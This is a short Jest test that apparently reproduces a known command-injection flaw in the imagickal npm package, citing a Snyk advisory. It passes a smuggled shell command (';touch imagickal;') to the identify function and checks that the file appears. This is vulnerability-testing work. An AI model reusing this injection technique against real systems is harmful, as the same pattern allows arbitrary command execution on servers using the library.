//https://security.snyk.io/vuln/SNYK-JS-IMAGICKAL-1060040
test("Remote code execution in imagickal", () => {
  const im = require("imagickal");
  const fs = require("fs");
  const path = "./imagickal";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  try {
    im.identify(";touch imagickal;").then(function (data) {});
  } catch (error) {}

  sleep.sleep(3);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
